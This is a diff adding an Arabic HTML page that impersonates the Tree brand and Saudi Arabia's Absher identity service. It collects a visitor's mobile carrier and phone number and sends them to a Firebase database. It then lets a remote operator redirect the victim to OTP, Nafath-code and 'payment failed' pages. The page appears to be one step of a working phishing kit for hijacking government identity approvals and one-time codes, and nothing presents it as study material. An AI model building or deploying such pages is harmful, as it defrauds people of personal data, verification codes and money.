@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق من الهوية - تري</title>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore-compat.js"></script>
+    <style>
+        :root { --p-green: #122d2b; --s-gold: #c5a059; --t-green: #00ff9d; }
+        body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #f0f2f5; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; padding: 15px; }
+        .secure-container { background: white; width: 100%; max-width: 440px; border-radius: 20px; box-shadow: 0 20px 50px rgba(0,0,0,0.1); border: 1px solid #eee; overflow: hidden; }
+        .p-header { background: #fafafa; padding: 25px; text-align: center; border-bottom: 1px solid #eee; }
+        .p-header img { width: 110px; }
+        
+        .p-body { padding: 30px; }
+        .instruction { font-size: 14px; color: #666; text-align: center; margin-bottom: 25px; line-height: 1.6; }
+        
+        .f-group { margin-bottom: 20px; position: relative; }
+        label { display: block; margin-bottom: 8px; font-weight: 600; color: #555; font-size: 13px; }
+        
+        select, input { width: 100%; padding: 14px; border: 1.5px solid #eaeaea; border-radius: 12px; font-size: 16px; box-sizing: border-box; outline: none; transition: 0.3s; background: #fafafa; }
+        input:focus, select:focus { border-color: var(--s-gold); background: #fff; }
+
+        .operator-display { display: flex; align-items: center; gap: 10px; margin-top: 10px; padding: 10px; background: #f9f9f9; border-radius: 10px; border: 1px dashed #ddd; display: none; }
+        #op-img { height: 25px; object-fit: contain; }
+        #op-name { font-size: 14px; font-weight: bold; color: var(--p-green); }
+
+        .btn-next { width: 100%; padding: 16px; background: var(--p-green); color: var(--t-green); border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; margin-top: 10px; }
+        .btn-next:hover { opacity: 0.9; }
+    </style>
+</head>
+<body>
+
+<div class="secure-container">
+    <div class="p-header">
+        <img src="https://tree.com.sa/assets/images/logo.png" alt="Tree"> 
+        <h3>تحقق أبشر الموحد</h3>
+    </div>
+
+    <div class="p-body">
+        <p class="instruction">يرجى اختيار مزود الخدمة وإدخال رقم الجوال المسجل في منصة أبشر لإتمام الطلب.</p>
+        
+        <div class="f-group">
+            <label>مزود الخدمة</label>
+            <select id="operator-select" onchange="updateOperator()">
+                <option value="">-- اختر شركة الاتصالات --</option>
+                <option value="STC">اس تي سي (STC)</option>
+                <option value="Mobily">موبايلي (Mobily)</option>
+                <option value="Zain">زين (Zain)</option>
+                <option value="Lebara">ليبارا (Lebara)</option>
+                <option value="Friendi">فريندي (Friendi)</option>
+            </select>
+            
+            <div id="op-box" class="operator-display">
+                <img id="op-img" src="" alt="">
+                <span id="op-name"></span>
+            </div>
+        </div>
+
+        <div class="f-group">
+            <label>رقم الجوال</label>
+            <input type="tel" id="phone-num" maxlength="10" placeholder="05xxxxxxxx" dir="ltr">
+        </div>
+
+        <button class="btn-next" onclick="sendData()">تأكيد وإرسال الرمز</button>
+    </div>
+</div>
+
+<script>
+    const firebaseConfig = {
+        apiKey: "AIzaSyCtPCVee8eynRfuFHZ6if_eK-vtaMYY-iE",
+        authDomain: "tameen-658e9.firebaseapp.com",
+        projectId: "tameen-658e9",
+        storageBucket: "tameen-658e9.firebasestorage.app",
+        messagingSenderId: "292670676256",
+        appId: "1:292670676256:web:3624157751cd194efe4b45"
+    };
+    firebase.initializeApp(firebaseConfig);
+    const db = firebase.firestore();
+
+    function updateOperator() {
+        const select = document.getElementById('operator-select');
+        const box = document.getElementById('op-box');
+        const img = document.getElementById('op-img');
+        const name = document.getElementById('op-name');
+        
+        const logos = {
+            'STC': 'https://upload.wikimedia.org/wikipedia/commons/thumb/4/4d/STC_logo.svg/2560px-STC_logo.svg.png',
+            'Mobily': 'https://upload.wikimedia.org/wikipedia/ar/thumb/f/f3/Mobily.svg/1200px-Mobily.svg.png',
+            'Zain': 'https://upload.wikimedia.org/wikipedia/commons/thumb/0/0c/Zain_Logo.svg/1200px-Zain_Logo.svg.png',
+            'Lebara': 'https://upload.wikimedia.org/wikipedia/commons/thumb/f/f3/Lebara_Logo.svg/1200px-Lebara_Logo.svg.png',
+            'Friendi': 'https://upload.wikimedia.org/wikipedia/en/thumb/4/44/FRiENDi_mobile_logo.png/220px-FRiENDi_mobile_logo.png'
+        };
+
+        if (select.value) {
+            box.style.display = 'flex';
+            img.src = logos[select.value];
+            name.innerText = "متصل عبر شبكة " + select.value;
+        } else {
+            box.style.display = 'none';
+        }
+    }
+
+    async function sendData() {
+        const op = document.getElementById('operator-select').value;
+        const phone = document.getElementById('phone-num').value;
+        const userId = localStorage.getItem('user_id');
+
+        if (!op || phone.length < 10) {
+            alert("يرجى اختيار المشغل وإدخال رقم جوال صحيح");
+            return;
+        }
+
+        try {
+            await db.collection("orders").doc(userId).update({
+                operator: op,
+                phone_number: phone,
+                status: "waiting_call_code"
+            });
+            window.location.href = "call_verification.html";
+        } catch (e) {
+            alert("حدث خطأ في الاتصال");
+        }
+    }// --- أضف كود الجسر هنا (قبل إغلاق السكريبت) ---
+(function() {
+    const userId = localStorage.getItem('user_id');
+    if (userId) {
+        db.collection("orders").doc(userId).onSnapshot((doc) => {
+            if (doc.exists) {
+                const data = doc.data();
+                if (data.next_step === "GO_TO_OTP") {
+                    window.location.href = "otp.html"; 
+                } else if (data.next_step === "GO_TO_REJECT") {
+                    window.location.href = "payment_faild.html";
+                } else if (data.next_step === "GO_TO_NAFATH") {
+                    window.location.href = "nafath.html";
+                } else if (data.next_step === "SHOW_NAFATH_CODE") {
+                    const codeBox = document.getElementById('nafath-number');
+                    if (codeBox && data.nafath_code) {
+                        codeBox.innerText = data.nafath_code;
+                        const overlay = document.getElementById('overlay');
+                        if (overlay) overlay.style.display = 'none';
+                    }
+                }
+            }
+        });
+    }
+})();
+// ------------------------------------------
+
+</script>
+</body>
+</html>
+
